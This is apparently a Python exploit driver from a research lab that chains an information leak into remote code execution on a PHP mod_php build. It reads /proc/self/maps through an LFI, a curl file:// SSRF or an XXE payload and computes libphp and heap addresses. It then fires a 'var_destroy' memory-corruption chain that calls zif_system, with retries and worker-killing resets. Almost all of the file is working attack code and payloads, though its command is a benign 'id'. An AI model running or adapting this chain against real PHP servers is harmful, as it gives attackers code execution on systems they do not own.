#!/usr/bin/env python3
"""Patched-build var_destroy chain seeded by an *external* leak (lab-only).

The leak is an application-level LFI that includes /proc/self/maps
(`lab-pure-modphp/webroot/lfi.php`). From the map we recover:
  - libphp base (the `libphp.so` r-xp mapping at file offset 0)
  - the ZendMM 2 MiB main chunk (a 2 MiB-aligned rw-p anonymous mapping)

Then the proven amplifier fires the var_destroy chain on a fresh worker at
`main + 0x6a018` with `zif_system` derived from libphp. No /proc is used by
this driver's fire path; the leak is the application's LFI.

Lab-only; fixed benign command `id>/tmp/vd 2>&1`.
"""
import argparse
import importlib.util
import os
import re
import sys
import time

import urllib.parse
import urllib.request

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from php2shell import maps, profiles, vdseed  # noqa: E402


def _imp():
    p = os.path.join(os.path.dirname(os.path.abspath(__file__)),
                     "verify_vardestroy_rce.py")
    spec = importlib.util.spec_from_file_location("vd", p)
    m = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(m)
    return m


def _maps_text(host, port, front, path, param):
    """Fetch this worker's maps text through one of three app-level oracles."""
    if front == "lfi":
        path = path or "/lfi.php"
        param = param or "page"
        target = "/proc/self/maps"
    elif front == "curl":
        path = path or "/ssrf.php"
        param = param or "u"
        target = "file:///proc/self/maps"
    elif front == "xxe":
        path = path or "/xxe.php"
        param = param or "x"
        target = ('<?xml version="1.0"?><!DOCTYPE r ['
                  '<!ENTITY f SYSTEM "file:///proc/self/maps">]><r>&f;</r>')
    else:
        raise SystemExit(f"unknown front {front!r}")
    url = f"http://{host}:{port}{path}?" + urllib.parse.urlencode({param: target})
    with urllib.request.urlopen(url, timeout=20) as resp:
        return resp.read().decode("latin-1")


def leak_candidates(host, port, front="lfi", path=None, param=None):
    """Return (lib, [main candidates]) from a maps leak via `front`.

    The ZendMM main chunk is a 2 MiB-aligned rw anonymous mapping. Other
    anonymous mappings can briefly qualify, so rather than trusting one pick
    we return every candidate (exactly-2 MiB ones first) and let the driver
    try them. This is the b4 hardening: a wrong pick must not end the run.
    """
    text = _maps_text(host, port, front, path, param)
    return maps.parse_maps(text)


def leak_maps(host, port):
    lib, mains = leak_candidates(host, port)
    return lib, (mains[0] if mains else None)


def zif_from_lib(container, lib):
    r = __import__("subprocess").run(
        ["docker", "exec", container, "sh", "-c",
         "readelf -sW /usr/lib/apache2/modules/libphp.so | grep -E ' zif_system$'"],
        capture_output=True, text=True)
    for line in r.stdout.splitlines():
        parts = line.split()
        if parts and parts[-1] == "zif_system":
            return lib + int(parts[1], 16)
    return 0


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--target", default="127.0.0.1:18131")
    ap.add_argument("--container", default="php2shell-pure-arm64-8427")
    ap.add_argument("--build", default=None,
                    help="profile build, e.g. 8.4.27 (defaults from container)")
    ap.add_argument("--delta", type=lambda x: int(x, 0), default=None,
                    help="override the fresh-worker main -> carrier offset")
    ap.add_argument("--proof", default=os.path.join(
        os.path.dirname(os.path.dirname(os.path.abspath(__file__))),
        "lab-pure-modphp", "out", "vd"))
    ap.add_argument("--max-candidates", type=int, default=4,
                    help="try up to N leaked main-chunk candidates")
    ap.add_argument("--retries", type=int, default=3,
                    help="re-attempt the candidate set N times (reclaim is "
                         "nondeterministic); the bias control still blocks")
    ap.add_argument("--front", default="lfi", choices=["lfi", "curl", "xxe"],
                    help="maps-leak transport: app LFI, curl file:// SSRF, or XXE")
    ap.add_argument("--front-path", default=None,
                    help="endpoint for the front (default /lfi.php,/ssrf.php,/xxe.php)")
    ap.add_argument("--front-param", default=None,
                    help="query parameter (default page,u,x)")
    ap.add_argument("--bias-zif", type=lambda x: int(x, 0), default=0,
                    help="shift zif_system to prove the address is load-bearing")
    args = ap.parse_args()

    vd = _imp()
    host, _, port = args.target.partition(":")
    port = int(port or 80)

    build = args.build
    if build is None:
        r = __import__("subprocess").run(
            ["docker", "exec", args.container, "php", "-r",
             "echo PHP_VERSION;"], capture_output=True, text=True)
        build = r.stdout.strip() or None
    profile = profiles.find(php_version=build, arch="aarch64") if build else None
    if profile is None:
        print(f"[!] no profile for build {build!r}")
        return 2

    print(f"[1] external leak via {args.front}: maps -> libphp + ZendMM main")
    lib, mains = leak_candidates(host, port, args.front,
                                 args.front_path, args.front_param)
    if not lib or not mains:
        print(f"[!] leak failed (lib={lib} candidates={mains})")
        return 2
    zif = zif_from_lib(args.container, lib)
    if not zif:
        print("[!] zif_system symbol not found")
        return 2
    if args.bias_zif:
        zif += args.bias_zif
    print(f"    libphp={lib:#x}  zif_system={zif:#x}  candidates="
          + ", ".join(f"{m:#x}" for m in mains[:args.max_candidates]))

    # Try each leaked main-chunk candidate: a wrong pick only resets the
    # worker, it does not end the run (b4 hardening). Reclaim is
    # nondeterministic, so re-attempt the set a few times.
    cands = mains[:args.max_candidates]
    for attempt in range(1, args.retries + 1):
        for idx, main in enumerate(cands, 1):
            try:
                addr = (vdseed.align_main(main) + args.delta
                        if args.delta is not None
                        else vdseed.carrier_from(main, "main", profile))
            except vdseed.SeedError as exc:
                print(f"[!] shim refused: {exc}")
                return 2

            print(f"[2] attempt {attempt}/{args.retries} candidate {idx}/{len(cands)}: "
                  f"main={main:#x}; reset the worker")
            vd.sh(args.container, "P=$(pgrep -x apache2 | grep -v '^1$' | "
                                  "tail -1); kill -9 $P 2>/dev/null")
            time.sleep(2.0)
            vd.worker_pid(args.container)

            print(f"[3] fire at main+{addr - vdseed.align_main(main):#x} = {addr:#x} "
                  f"(no /proc)")
            if vd.fire(host, port, args.container, addr, zif, args.proof):
                print()
                print(f"[EVIDENCE] external leak ({args.front}) -> main+delta -> uid=33")
                return 0
            print("    no proof for this candidate")

    print()
    print("[!] no proof written for any candidate")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
